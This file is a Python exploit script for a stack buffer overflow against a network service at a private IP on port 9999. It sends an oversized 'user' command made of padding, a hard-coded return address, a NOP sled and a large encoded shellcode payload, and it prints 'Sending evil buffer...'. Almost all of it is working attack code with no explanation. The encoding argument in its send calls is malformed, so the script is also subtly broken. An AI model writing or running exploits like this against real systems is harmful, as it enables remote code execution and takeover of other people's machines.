import socket

ip = "192.168.133.131"
port = 9999

prefix = "user "
offset = 2012
overflow = "A" * offset
retn = "\xdf\x14\x50\x62"
padding = "\x90" * 20
buf =  ""
buf += "\xbf\xc4\x44\xe7\xa2\xd9\xc7\xd9\x74\x24\xf4\x58"
buf += "\x29\xc9\xb1\x52\x31\x78\x12\x83\xc0\x04\x03\xbc"
buf += "\x4a\x05\x57\xc0\xbb\x4b\x98\x38\x3c\x2c\x10\xdd"
buf += "\x0d\x6c\x46\x96\x3e\x5c\x0c\xfa\xb2\x17\x40\xee"
buf += "\x41\x55\x4d\x01\xe1\xd0\xab\x2c\xf2\x49\x8f\x2f"
buf += "\x70\x90\xdc\x8f\x49\x5b\x11\xce\x8e\x86\xd8\x82"
buf += "\x47\xcc\x4f\x32\xe3\x98\x53\xb9\xbf\x0d\xd4\x5e"
buf += "\x77\x2f\xf5\xf1\x03\x76\xd5\xf0\xc0\x02\x5c\xea"
buf += "\x05\x2e\x16\x81\xfe\xc4\xa9\x43\xcf\x25\x05\xaa"
buf += "\xff\xd7\x57\xeb\x38\x08\x22\x05\x3b\xb5\x35\xd2"
buf += "\x41\x61\xb3\xc0\xe2\xe2\x63\x2c\x12\x26\xf5\xa7"
buf += "\x18\x83\x71\xef\x3c\x12\x55\x84\x39\x9f\x58\x4a"
buf += "\xc8\xdb\x7e\x4e\x90\xb8\x1f\xd7\x7c\x6e\x1f\x07"
buf += "\xdf\xcf\x85\x4c\xf2\x04\xb4\x0f\x9b\xe9\xf5\xaf"
buf += "\x5b\x66\x8d\xdc\x69\x29\x25\x4a\xc2\xa2\xe3\x8d"
buf += "\x25\x99\x54\x01\xd8\x22\xa5\x08\x1f\x76\xf5\x22"
buf += "\xb6\xf7\x9e\xb2\x37\x22\x30\xe2\x97\x9d\xf1\x52"
buf += "\x58\x4e\x9a\xb8\x57\xb1\xba\xc3\xbd\xda\x51\x3e"
buf += "\x56\x25\x0d\xc5\x27\xcd\x4c\xc5\x36\x52\xd8\x23"
buf += "\x52\x7a\x8c\xfc\xcb\xe3\x95\x76\x6d\xeb\x03\xf3"
buf += "\xad\x67\xa0\x04\x63\x80\xcd\x16\x14\x60\x98\x44"
buf += "\xb3\x7f\x36\xe0\x5f\xed\xdd\xf0\x16\x0e\x4a\xa7"
buf += "\x7f\xe0\x83\x2d\x92\x5b\x3a\x53\x6f\x3d\x05\xd7"
buf += "\xb4\xfe\x88\xd6\x39\xba\xae\xc8\x87\x43\xeb\xbc"
buf += "\x57\x12\xa5\x6a\x1e\xcc\x07\xc4\xc8\xa3\xc1\x80"
buf += "\x8d\x8f\xd1\xd6\x91\xc5\xa7\x36\x23\xb0\xf1\x49"
buf += "\x8c\x54\xf6\x32\xf0\xc4\xf9\xe9\xb0\xe5\x1b\x3b"
buf += "\xcd\x8d\x85\xae\x6c\xd0\x35\x05\xb2\xed\xb5\xaf"
buf += "\x4b\x0a\xa5\xda\x4e\x56\x61\x37\x23\xc7\x04\x37"
buf += "\x90\xe8\x0c"
payload = buf
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect = s.connect((ip, port))
	s.recv(1024)
	print("Sending evil buffer...")
	s.send(bytes(prefix, "latin-1"  + "\r\n"))
	s.recv(1024)
	s.send(bytes(buffer, "latin-1"  + "\r\n"))
	print("Done!")
except:
	print("Could not connect.")
